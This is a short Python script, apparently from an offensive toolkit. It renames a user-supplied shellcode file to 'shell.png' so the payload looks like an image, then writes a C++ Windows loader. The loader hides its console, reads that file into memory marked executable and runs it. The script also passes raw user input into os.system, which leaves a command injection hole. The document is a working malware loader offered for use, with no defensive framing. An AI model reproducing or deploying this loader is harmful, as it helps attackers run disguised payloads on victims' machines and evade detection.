#!/usr/bin/python

import sys
import os
from termcolor import colored

def imageSehllcode():
    shellcode_add = input("\033[4mPlease input Shellcode:\033[0m" + colored(" >>", "green"))
    os.system('mv ' + shellcode_add + ' /root/shell.png')
    load = '''
        #include <windows.h>
        #include <stdlib.h>
        #include <stdio.h>
        
        
        int main(){
            FreeConsole();
            FILE* fp;
            size_t size;
            unsigned char* buffer;
        
            fp = fopen("shell.png","rb");
            fseek(fp,0,SEEK_END);
            size = ftell(fp);
            fseek(fp,0,SEEK_SET);
            buffer = (unsigned char*)malloc(size);
        
            fread(buffer,size,1,fp);
            void *exec = VirtualAlloc(0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            memcpy(exec, buffer, size);
            ((void(*)())exec)();
        
            return 0;
        }
        
         '''
    with open('/root/shellcode.cpp', 'w+') as f:
        f.write(load)
